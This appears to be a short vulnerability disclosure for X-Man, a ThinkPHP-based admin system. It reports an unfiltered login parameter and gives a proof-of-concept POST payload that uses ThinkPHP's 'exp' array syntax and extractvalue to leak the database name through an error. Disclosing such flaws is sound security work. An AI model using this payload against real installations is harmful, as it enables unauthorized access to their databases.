X-Man is a background system developed based on the ThinkPHP framework. Due to the failure to comply with the ThinkPHP framework development standard, the SQL injection vulnerability was caused when it landed。

Poc：
http://ip/admin/login/check

POST: para=username[0]%3Dexp%26username[1]%3D=11 and(select extractvalue(1,concat(0x7e,(select database()))))%26password%3D213%26token%3D


Example：

![Image](https://user-images.githubusercontent.com/65259880/203694221-fcd95389-4b9c-497d-8b89-b98bcf781248.png)

Analyze:
file：https://github.com/imxiny/x-man/blob/master/Application/Admin/Controller/LoginController.class.php


![Image](https://user-images.githubusercontent.com/65259880/203694740-6d2af099-1bae-4343-8ee8-6ece50cfa261.png)


There is no filter of the parameter of the 60th line，So we can construct a SQL injecting POC with the ThinkPHP framework。
